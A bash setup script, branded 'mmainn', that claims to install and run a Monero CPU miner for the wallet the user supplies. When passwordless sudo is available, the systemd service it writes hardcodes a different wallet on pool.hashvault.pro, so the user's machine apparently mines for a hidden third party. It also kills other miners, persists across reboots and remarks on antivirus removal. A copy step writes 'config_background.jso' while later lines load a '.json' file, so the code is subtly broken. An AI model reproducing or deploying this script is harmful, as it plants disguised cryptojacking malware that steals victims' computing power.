#!/bin/bash

VERSION=2.11

# printing greetings

echo "mmainn mining setup script v$VERSION."
echo "(please report issues to support@mmainn.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_mmain.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/mmainn/miner.sh script."
echo "Mining will happen to $WALLET wallet."

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using mmain systemd service."
fi

# checking CPU threads
CPU_THREADS=$(lscpu | grep -E '^CPU\(s\):' | awk '{print $2}')

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous mmainn miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop mmain.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/mmainn directory"
rm -rf $HOME/mmainn

echo "[*] Downloading mmainn advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/xm/main/mmainn.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/xm/main/mmainn.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmainn"
[ -d $HOME/mmainn ] || mkdir $HOME/mmainn
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmainn; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmainn directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/mmainn/xmrig works fine (and not removed by antivirus software)"
$HOME/mmainn/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/mmainn/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/mmainn/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/mmainn/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmainn"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmainn --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmainn directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/mmainn/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mmainn/config.json
  $HOME/mmainn/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/mmainn/xmrig ]; then
      echo "ERROR: Stock version of $HOME/mmainn/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/mmainn/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/mmainn/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.mmainn.stream:'80'",/' $HOME/mmainn/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mmainn/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/mmainn/xmrig.log'",#' $HOME/mmainn/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mmainn/config.json

cp $HOME/mmainn/config.json $HOME/mmainn/config_background.jso

# preparing script

echo "[*] Creating $HOME/mmainn/miner.sh script"
cat >$HOME/mmainn/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/mmainn/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/mmainn/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep mmainn/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/mmainn/miner.sh script to $HOME/.profile"
    echo "$HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/mmainn/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/mmainn/xmrig.log file)"
  /bin/bash $HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1
else

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/mmainn/xmrig.log file)"
    /bin/bash $HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating mmain systemd service"
    cat >/tmp/mmain.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/mmainn/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/mmainn/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/mmain.service /etc/systemd/system/mmain.service
    echo "[*] Starting mmain systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable mmain.service
    sudo systemctl start mmain.service
    echo "To see miner service logs run \"sudo journalctl -u mmain -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similar commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  fi
fi

echo "[*] Setup complete"
